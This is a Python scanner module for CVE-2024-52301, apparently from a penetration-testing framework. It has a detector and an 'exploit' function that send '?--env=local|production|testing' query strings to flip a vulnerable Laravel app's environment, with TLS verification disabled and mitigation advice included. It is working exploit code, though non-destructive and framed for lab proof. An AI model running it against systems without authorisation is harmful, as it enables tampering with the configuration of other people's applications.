#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2024-52301')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""Detector for CVE-2024-52301.

Laravel versions before the advisory fixes trusted ``$_SERVER['argv']`` during
environment detection. When PHP is serving web requests with
``register_argc_argv=On``, a query string such as ``?--env=local`` can populate
``argv`` and make Laravel handle the request as a different application
environment.

This detector is intentionally proof-oriented: it only returns a positive result
when the target exposes a benign surface that reflects ``app()->environment()``
or an equivalent marker. Without such a surface, a remote-only check cannot
reliably distinguish "not vulnerable" from "vulnerable but not observable".
"""


import json
import re
from typing import Dict, Iterable, Optional
from urllib.parse import quote

import requests

from modules.core import http_config
from modules.core.http_config import app_url, normalize_base

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

ENVS = ("local", "production", "testing")

# Lab/default proof surfaces that reflect app()->environment() or equivalent markers.
DEFAULT_PROOF_PATHS = (
    "/",
    "/poc/cve-2024-52301",
    "/poc-env",
    "/cve-2024-52301",
)


def scan(
    target_url: str,
    *,
    session=None,
    username=None,
    password=None,
    laravel_info=None,
    proof_paths: Optional[Iterable[str]] = None,
    **kwargs,
) -> Optional[Dict[str, object]]:
    """Detect CVE-2024-52301 with a harmless environment-flip proof.

    Positive proof requires a baseline response and an injected ``?--env=...``
    response where the surfaced application environment changes to the injected
    value. This is a GET-only check.
    """
    if not target_url:
        return None

    sess = session or http_config.get_auth_session()
    base = normalize_base(target_url)
    paths = tuple(proof_paths or DEFAULT_PROOF_PATHS)

    for path in paths:
        proof_url = app_url(base, path)
        result = _probe_environment_flip(sess, proof_url)
        if result:
            return result

    return None


def _probe_environment_flip(sess, proof_url: str) -> Optional[Dict[str, object]]:
    try:
        baseline = sess.get(proof_url, timeout=8, allow_redirects=True, verify=False)
    except Exception:
        return None

    if baseline.status_code >= 500:
        return None

    baseline_signal = _extract_environment_signal(baseline)

    for env in ENVS:
        injected_url = _append_env_arg(proof_url, env)
        try:
            injected = sess.get(injected_url, timeout=8, allow_redirects=True, verify=False)
        except Exception:
            continue

        injected_signal = _extract_environment_signal(injected)
        if _is_positive_flip(env, baseline_signal, injected_signal):
            return {
                "vulnerable": True,
                "status": "confirmed_vulnerable",
                "verdict": "confirmed_vulnerable",
                "proof_type": "safe_active",
                "severity": "High",
                "category": "config_manipulation",
                "cve": "CVE-2024-52301",
                "endpoint": proof_url,
                "url": injected_url,
                "http_status": injected.status_code,
                "confidence": "high",
                "requires": ["register_argc_argv=On", "affected Laravel version"],
                "evidence": [
                    f"baseline environment signal: {baseline_signal!r}",
                    f"crafted query ?--env={env} surfaced: {injected_signal!r}",
                ],
                "mitigation": (
                    "Upgrade laravel/framework to a patched release and set "
                    "register_argc_argv=Off for web SAPIs."
                ),
                "artifacts": {
                    "baseline_url": proof_url,
                    "injected_url": injected_url,
                    "baseline_signal": baseline_signal,
                    "injected_signal": injected_signal,
                    "payload": f"?--env={env}",
                },
            }

    return None


def _append_env_arg(url: str, env: str) -> str:
    separator = "&" if "?" in url else "?"
    return f"{url}{separator}--env={quote(env, safe='')}"


def _is_positive_flip(env: str, baseline: Optional[str], injected: Optional[str]) -> bool:
    if not injected:
        return False
    injected_l = injected.lower()
    baseline_l = (baseline or "").lower()
    return injected_l == env and baseline_l != injected_l


def _extract_environment_signal(resp: requests.Response) -> Optional[str]:
    """Extract a surfaced Laravel app environment from JSON or lightweight HTML."""
    body = resp.text or ""
    ctype = (resp.headers.get("content-type") or "").lower()

    if "json" in ctype or body.lstrip().startswith(("{", "[")):
        try:
            data = resp.json()
            signal = _extract_environment_from_json(data)
            if signal:
                return signal
        except (ValueError, json.JSONDecodeError):
            pass

    lower = body.lower()

    # Fixture marker: cve-2024-52301:local
    marker = re.search(r"cve-2024-52301\s*:\s*(local|production|testing)", lower)
    if marker:
        return marker.group(1)

    # Common lab renderings: app_env: local, environment=production, etc.
    field = re.search(
        r"(?:app[_ -]?env|laravel[_ -]?env|environment|env)\s*[:=]\s*"
        r"(local|production|testing)",
        lower,
    )
    if field:
        return field.group(1)

    return None


def _extract_environment_from_json(data) -> Optional[str]:
    if isinstance(data, dict):
        for key in ("app_env", "laravel_env", "environment", "env"):
            value = data.get(key)
            if isinstance(value, str) and value.lower() in ENVS:
                return value.lower()
        marker = data.get("marker")
        if isinstance(marker, str):
            m = re.search(r"cve-2024-52301\s*:\s*(local|production|testing)", marker.lower())
            if m:
                return m.group(1)
        for value in data.values():
            nested = _extract_environment_from_json(value)
            if nested:
                return nested
    elif isinstance(data, list):
        for item in data:
            nested = _extract_environment_from_json(item)
            if nested:
                return nested
    return None


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""Lab-safe exploitation proof for CVE-2024-52301.

This module demonstrates the real advisory behavior: a web request carrying
``?--env=<value>`` changes Laravel's application environment when the target is
affected and PHP exposes query-string argv to non-CLI SAPIs.
"""


import json
from typing import Iterable, Optional

from modules.core import http_config
from modules.core.http_config import app_url, normalize_base


def exploit(
    target_url: str,
    *,
    username: str = None,
    password: str = None,
    command: str = None,
    options: dict = None,
    session=None,
    **kwargs,
) -> dict:
    """Exploit CVE-2024-52301 by proving controlled environment selection.

    The payload is a harmless GET request with ``?--env=<env>``. ``command`` is
    deliberately ignored: this CVE is configuration/environment manipulation, not
    a command-execution primitive by itself.
    """
    sess = session or http_config.get_auth_session()
    opts = options or {}
    env = str(opts.get("env") or "local").lower()
    paths: Iterable[str]
    if opts.get("path"):
        paths = (str(opts["path"]),)
    else:
        paths = tuple(opts.get("proof_paths") or DEFAULT_PROOF_PATHS)

    result = {
        "cve": "CVE-2024-52301",
        "attempted": True,
        "success": False,
        "vuln_class": "config_manipulation",
        "outcome": None,
        "outcome_tag": None,
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": ["register_argc_argv=On", "affected Laravel version", "observable env proof surface"],
        "reason": "",
    }

    if env not in ("local", "production", "testing"):
        result["attempted"] = False
        result["reason"] = "unsupported env value; use local, production, or testing"
        return result

    if command:
        result["artifacts"]["command_ignored"] = command

    try:
        base = normalize_base(target_url)
        if not base:
            result["attempted"] = False
            result["reason"] = "no target_url provided"
            return result

        attempts = []
        for path in paths:
            proof_url = app_url(base, path)
            baseline_url = proof_url
            injected_url = _append_env_arg(proof_url, env)
            attempt = {
                "baseline_url": baseline_url,
                "injected_url": injected_url,
                "payload": f"?--env={env}",
            }

            try:
                baseline = sess.get(baseline_url, timeout=8, allow_redirects=True, verify=False)
                injected = sess.get(injected_url, timeout=8, allow_redirects=True, verify=False)
            except Exception as e:
                attempt["error"] = str(e)
                attempts.append(attempt)
                continue

            base_signal = _extract_environment_signal(baseline)
            inj_signal = _extract_environment_signal(injected)
            attempt.update(
                {
                    "baseline_http_status": baseline.status_code,
                    "injected_http_status": injected.status_code,
                    "baseline_signal": base_signal,
                    "injected_signal": inj_signal,
                    "body_size_delta": len(injected.content) - len(baseline.content),
                }
            )
            attempts.append(attempt)

            if inj_signal == env and base_signal != inj_signal:
                result["success"] = True
                result["outcome"] = "EXPLOITED (environment manipulated)"
                result["outcome_tag"] = "env-flipped"
                result["artifacts"] = attempt
                result["evidence"] = (
                    f"Baseline {baseline_url} surfaced environment {base_signal!r}; "
                    f"crafted request {injected_url} surfaced {inj_signal!r}."
                )
                result["detail"] = (
                    "Unauthenticated GET controlled Laravel's application environment "
                    f"for this request via --env={env}."
                )
                return result

        result["artifacts"] = {"attempts": attempts}
        result["reason"] = (
            "No observable environment flip. Target may be patched, "
            "register_argc_argv may be Off, Laravel version may be unaffected, "
            "or no proof route exposes app()->environment()."
        )
        result["detail"] = "CVE-2024-52301 not proven on the supplied surface."
        return result

    except Exception as e:
        result["reason"] = f"unexpected error during CVE-2024-52301 proof: {type(e).__name__}: {e}"
        return result


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    env = sys.argv[2] if len(sys.argv) > 2 else "local"
    print(json.dumps(exploit(target, options={"env": env}), indent=2))
